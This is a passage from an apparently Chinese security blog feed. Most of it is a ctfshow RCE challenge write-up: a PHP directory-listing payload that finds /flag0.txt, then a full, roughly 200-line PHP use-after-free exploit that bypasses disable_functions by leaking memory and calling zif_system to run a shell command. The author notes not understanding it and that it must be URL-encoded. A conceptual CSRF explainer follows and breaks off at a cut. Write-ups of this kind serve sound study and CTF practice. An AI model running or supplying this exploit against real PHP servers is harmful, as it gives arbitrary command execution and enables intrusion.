class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取到 flag 在 &#x2F;flag0.txt  下</p><p>然后使用 UAF 脚本读取flag（不懂）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br> <br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> <br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br> <br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br> <br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br> <br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br> <br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br> <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br> <br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br> <br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br></code></pre></td></tr></table></figure><p>需要进行url编码使用</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="/2023/08/24/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/CSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/12/17/GM9dmatw8sDLx2g.jpg" alt="v2-36fa2f6e2cfee19373dd2e8caf628892_1440w"></p><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为One Click Attack 或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常 不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击性往往不大流行（因此对其进行防范的资源也相对少）和难以防范，所以被认为比XSS更具危险性。</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作：转账、购买商品等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份认证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p><img src="https://s2.loli.net/2022/12/17/Cvq8Yls9Of7HMmN.png" alt="1660149231_62f3ddef64a9f39744d07"></p><h3 id="CSRF攻击原理及过程："><a href="#CSRF攻击原理及过程：" class="headerlink" title="CSRF攻击原理及过程："></a>CSRF攻击原理及过程：</h3><blockquote><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p><p>2.在用户信息用过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p><p>3.用户未退出网站A之前，在同一浏览器中打开一个TAB页访问网站B；</p><p>4.网站B接受到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p><p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p></blockquote><h2 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h2><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求<a 